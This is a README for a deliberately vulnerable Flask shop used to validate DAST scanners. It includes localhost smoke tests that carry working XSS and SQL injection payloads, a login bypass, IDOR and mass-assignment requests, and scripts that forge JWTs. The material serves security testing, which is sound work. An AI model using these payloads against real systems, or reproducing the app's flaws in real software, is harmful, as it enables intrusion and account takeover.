# vulnShop

Deliberately vulnerable Flask e-commerce application for DAST validation.

## ⚠️ SECURITY WARNING

This application intentionally contains exploitable vulnerabilities. Run only on an isolated/local security-testing network. Never expose it publicly and never reuse its vulnerable authentication/JWT/database code in production.

## Requirements

- Docker
- Docker Compose

## Run

```bash
docker compose up --build
```

Open `http://localhost:5000`.

Health check:

```bash
curl http://localhost:5000/health
```

## Seed credentials

- `admin / admin123`
- `alice / password1`
- `bob / password2`

## Quick smoke tests

```bash
curl http://localhost:5000/health
curl -i "http://localhost:5000/search?q=%3Cscript%3Ealert(document.domain)%3C/script%3E"
curl -i "http://localhost:5000/product?id=1%20OR%201=1"
```

### Web SQL injection login bypass

```bash
curl -i -c cookies.txt -X POST http://localhost:5000/login -d "username=' OR '1'='1' --&password=x"
```

### Web IDOR

After authenticating as Alice:

```text
http://localhost:5000/account?id=3
http://localhost:5000/orders?id=3
```

### API login

```bash
curl -s -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password1"}'
```

### API auth token extraction

```bash
TOKEN="$(curl -s -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password1"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')"
```

Then:

```bash
curl -i http://localhost:5000/api/me -H "Authorization: Bearer $TOKEN"
```

### API IDOR

```bash
curl -i http://localhost:5000/api/users/3 -H "Authorization: Bearer $TOKEN"
curl -i http://localhost:5000/api/orders/3 -H "Authorization: Bearer $TOKEN"
```

### API SQL injection

```bash
curl -i "http://localhost:5000/api/products?search=%27%20OR%201=1%20--" -H "Authorization: Bearer $TOKEN"
```

### Mass assignment / privilege escalation

```bash
curl -i -X PATCH http://localhost:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

### Forged JWT with arbitrary HS256 secret

```bash
python3 - <<'PY'
import jwt
print(jwt.encode({"sub":2,"username":"alice","role":"admin"}, "wrong-secret", algorithm="HS256"))
PY
```

Use the resulting token on `/api/admin/users`. The server deliberately disables signature verification.

### Forged `alg=none` JWT

```bash
python3 - <<'PY'
import base64, json
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
h=b(json.dumps({"alg":"none","typ":"JWT"},separators=(",",":")).encode())
p=b(json.dumps({"sub":2,"username":"alice","role":"admin"},separators=(",",":")).encode())
print(h+"."+p+".")
PY
```

Use the token on `/api/admin/users`.

## DAST scanning

### Unauthenticated web scan

Target:

```text
http://localhost:5000
```

Useful starting points:

- `/`
- `/login`
- `/search?q=test`
- `/product?id=1`
- `/redirect?next=/`

### Authenticated web scan

Configure your scanner's form-based authentication against:

```text
POST /login
username=alice
password=password1
```

Then crawl:

```text
/account?id=2
/orders?id=2
/product?id=1
```

### Authenticated API scan

Import `openapi.yaml` into the DAST tool and configure:

```http
Authorization: Bearer <TOKEN>
```

Get a token from `/api/login` using `alice/password1`, or use the intentionally forgeable JWT behavior documented in `VULNERABILITIES.md`.

## Reset database

```bash
docker compose down -v
docker compose up --build
```

## Git

```bash
git init
git add .
git commit -m "Add vulnShop DAST validation target"
git remote add origin <YOUR_GITHUB_REPOSITORY>
git branch -M main
git push -u origin main
```

## Layout

```text
vulnShop/
├── app.py
├── Dockerfile
├── docker-compose.yml
├── requirements.txt
├── openapi.yaml
├── VULNERABILITIES.md
├── README.md
└── templates/
    ├── base.html
    ├── index.html
    ├── login.html
    ├── search.html
    ├── product.html
    ├── account.html
    └── orders.html
```
